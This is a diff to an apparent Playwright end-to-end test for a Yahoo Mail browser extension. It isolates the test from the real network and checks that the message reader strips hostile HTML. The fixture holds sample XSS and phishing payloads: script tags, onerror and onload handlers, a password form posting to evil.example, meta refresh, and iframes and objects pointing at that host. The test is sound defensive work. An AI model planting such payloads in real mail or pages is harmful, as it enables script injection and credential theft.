@@ -32,9 +32,14 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
 
 (async () => {
   const profile = fs.mkdtempSync(path.join(os.tmpdir(), "baltazar-mail-profile-"));
-  const ctx = await chromium.launchPersistentContext(profile, { channel: "chromium", headless: true, args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`] });
+  // No host outside the mocks resolves, so nothing can reach the real network.
+  const ctx = await chromium.launchPersistentContext(profile, { channel: "chromium", headless: true,
+    args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`, "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1"] });
   const sw = ctx.serviceWorkers()[0] || await ctx.waitForEvent("serviceworker");
   const extId = new URL(sw.url()).host;
+  // Requests to hosts without a mock are recorded and refused (later routes take precedence).
+  const unexpectedHosts = new Set();
+  await ctx.route(/^https?:\/\//, r => { unexpectedHosts.add(new URL(r.request().url()).hostname); return r.abort(); });
   const calls = [], docCalls = [];
   let failSaves = 0;   // draft saves to answer with a server error
   let failMoves = 0;   // moves to answer with a server error
@@ -101,9 +106,15 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
       const card = `<div id="paper" style="background-color:#ffffff;color:#333333">Card</div>`;
       // Drafts also carry a quote a hostile sender could plant: a box over the whole window, a
       // data: URL that is not an image, and one that does not decode.
+      // Projects messages carry what the reader's cleaning must remove or neutralise.
+      const unsafe = id.startsWith("MSG31_") ? `<script>parent.pwned = 1</script><img id="h-img" src="data:," onerror="parent.pwned = 1">` +
+        `<form id="h-form" action="https://evil.example/"><input id="h-input" name="pw"><button>Go</button></form>` +
+        `<a id="h-link" href="https://evil.example/" ping="https://evil.example/ping" target="_top">link</a>` +
+        `<meta http-equiv="refresh" content="0;url=https://evil.example/"><iframe id="h-frame" src="https://evil.example/"></iframe>` +
+        `<object id="h-obj" data="https://evil.example/x"></object><svg id="h-svg" onload="parent.pwned = 1"><circle r="1"/></svg>` : "";
       const hostile = id.startsWith("MSG3_") ? `<div id="overlay" style="position:fixed;inset:0;z-index:2147483647;background:#f00">Session expired</div>` +
         `<img src="data:text/html;base64,PGgxPmhpPC9oMT4=">` + `<img src="data:image/png;base64,@@not base64@@">` : "";
-      responses = [{ id: top.id, httpCode: 200, response: { result: { message, simpleBody: { html: `<p>Body of <b>${id}</b></p>${inline}${card}${hostile}` } } } }];
+      responses = [{ id: top.id, httpCode: 200, response: { result: { message, simpleBody: { html: `<p>Body of <b>${id}</b></p>${inline}${card}${hostile}${unsafe}` } } } }];
     }
     else if (uri === "/ws/docpreview/v2/fetch") {
       // Yahoo's converter: first ask is still queued, then pages arrive entity-encoded.
@@ -203,6 +214,17 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   await page.locator("#folder-list .folder", { hasText: "Projects" }).click(); await page.waitForTimeout(400);
   await page.locator("#rows .row").nth(1).click(); await page.waitForTimeout(600);
   results.readAfterSwitch = (await frameText()).slice(0, 30);
+  // the reader's cleaning: no script, forms, frames, objects, refresh or event handlers survive,
+  // and links open in a new tab without pings
+  results.unsafe = await page.frameLocator("#r-body").locator("body").evaluate(b => {
+    const d = b.ownerDocument;
+    const handlers = [...d.querySelectorAll("*")].flatMap(e => [...e.attributes].filter(a => /^on/i.test(a.name)).map(a => `${e.tagName}.${a.name}`));
+    const link = d.getElementById("h-link");
+    return { scripts: d.querySelectorAll("script").length, forms: d.querySelectorAll("form, input, button, textarea, select").length,
+      frames: d.querySelectorAll("iframe, object, embed").length, refresh: d.querySelectorAll('meta[http-equiv="refresh" i]').length, csp: d.querySelectorAll('meta[http-equiv="Content-Security-Policy"]').length, handlers,
+      link: link && { ping: link.hasAttribute("ping"), target: link.target, rel: link.rel }, img: !!d.getElementById("h-img") };
+  }).catch(e => ({ error: e.message }));
+  results.unsafe.pwned = await page.evaluate(() => window.pwned ?? null);
   const frameImgs = await page.frameLocator("#r-body").locator("img").evaluateAll(els => els.map(e => e.getAttribute("src") || ""));
   results.inlineParts = { partInlined: /^data:image\/png/.test(frameImgs[0] || ""), fromSource: /^data:image\/png/.test(frameImgs[1] || ""), proxyKept: frameImgs[2] === "https://ecp.yusercontent.com/p.png", hiddenFetched,
     clips: await page.locator("#rows .row .fl").evaluateAll(els => els.map(e => e.innerHTML ? 1 : 0).join("")),
@@ -778,6 +800,10 @@ const accounts = [{ id: "1", email: "me@yahoo.com", sendingName: "Me Myself", is
   expect(results.fontInitial[0] === "Helvetica" && results.fontInitial[1] === "13" && results.fontAfter[0] === "Georgia" && results.fontAfter[1] === "18", "font controls track caret: " + JSON.stringify([results.fontInitial, results.fontAfter]));
   expect(results.noListOnOpen && results.listOnClick && results.noListAfterPick, "address list only on click: " + JSON.stringify([results.noListOnOpen, results.listOnClick, results.noListAfterPick]));
   expect(results.print.url === "print.html" && results.print.body.startsWith("Body of"), "print page: " + JSON.stringify(results.print));
+  const u = results.unsafe;
+  expect(!u.error && !u.scripts && !u.forms && !u.frames && !u.refresh && u.csp === 1 && !u.handlers.length && u.link && !u.link.ping && u.link.target === "_blank" && /noopener/.test(u.link.rel) && u.pwned === null,
+    "the reader removes scripts, forms, frames, refresh, handlers and pings: " + JSON.stringify(u));
+  expect(!unexpectedHosts.size, "no request left for the real network: " + [...unexpectedHosts].join(", "));
   expect(results.slowLoad.rows > 0, "an action during a slow folder load leaves the folder filled: " + JSON.stringify(results.slowLoad));
   const de = results.draftEdit;
   expect(de.chips === 7 && /report\.pdf/.test(de.names) && /deck\.pptx/.test(de.names) && de.imgSrcs.filter(s => s.startsWith("data:")).length === 3 && !de.imgSrcs.some(s => s.includes("cloud-apis")) &&
